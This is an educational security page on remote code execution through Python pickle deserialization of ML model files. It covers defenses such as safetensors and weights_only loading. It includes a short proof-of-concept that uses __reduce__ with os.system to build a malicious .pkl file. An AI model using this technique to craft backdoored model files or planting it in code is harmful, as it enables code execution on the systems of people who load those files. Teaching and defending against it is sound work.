# Pickle Deserialization & Model Payloads

Python’s `pickle` format is widely used for saving and loading model weights, tokenizers, and pipeline objects. Unfortunately, it is **insecure by design** — and trivially exploitable for remote code execution (RCE).

## What Is Pickle?

`pickle` is a Python serialization format that allows you to save complex objects (like models, classes, or functions) to disk.

**BUT**: It is **code execution**, not just data loading.

```python
import pickle
obj = pickle.load(open("malicious_model.pkl", "rb"))
```

If `malicious_model.pkl` contains an attacker-defined class with a `__reduce__` method, it can execute **arbitrary system commands** during deserialization.

## Exploit Anatomy

### Crafting a Malicious Pickle

```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ("echo pwned > /tmp/hacked.txt",))

payload = pickle.dumps(RCE())

with open("exploit.pkl", "wb") as f:
    f.write(payload)
```

✅ This file will execute `echo pwned > /tmp/hacked.txt` upon being loaded.

## LLM-Specific Risk

Many open-source model sharing or finetuning pipelines rely on:

* `.pkl`, `.pt`, `.joblib`, `.ckpt` files
* Dynamically loaded classes
* Custom model wrappers saved as pickled objects

**Scenarios**:

* LoRA adapter saved as `.pkl` executes code on load
* Inference server loads untrusted `.pt` file with embedded payload
* Pretrained pipeline on Hugging Face contains a backdoored `tokenizer.pkl`

## Other Dangerous Formats

| Format         | Language       | Risk                           |
| -------------- | -------------- | ------------------------------ |
| `.pkl`         | Python         | Arbitrary code execution       |
| `.pt` / `.pth` | PyTorch        | Often contains pickled objects |
| `.ckpt`        | TensorFlow     | May include unsafe TF ops      |
| `.joblib`      | Scikit-learn   | Uses pickle under the hood     |
| `.onnx`        | Cross-platform | Unsafe custom ops possible     |
| `.safetensors` | Safe version   | ✅ Memory-safe (recommended)    |

## Real-World Exploits

* Research demos showing RCE via backdoored `.pt` files
* Fake Hugging Face model repos with malicious payloads
* Unverified model weights shared in Discord / GitHub triggering shell commands

## Detection Tips

* Avoid using `pickle.load()` on untrusted files
* Always inspect class definitions before loading
* Use `safetensors` instead of `.pt` or `.pkl` when possible

### Safe Loading (PyTorch)

```python
import torch

model = torch.load("model.pt", map_location="cpu", weights_only=True)
```

Better: use `safetensors.load_file(...)` for secure models

## Defenses

| Defense             | Action                                   |
| ------------------- | ---------------------------------------- |
| File Format Control | Use `.safetensors` or trusted `.pt` only |
| Check Hashes        | Compare SHA256 of model files            |
| Sandbox Loading     | Load in restricted Docker or VM          |
| Disable Pickle      | Use safe deserialization or tokenizer    |

## Summary

If your inference pipeline loads pickled files — even indirectly — it’s running code from disk.\
That code could be yours… or someone else's.
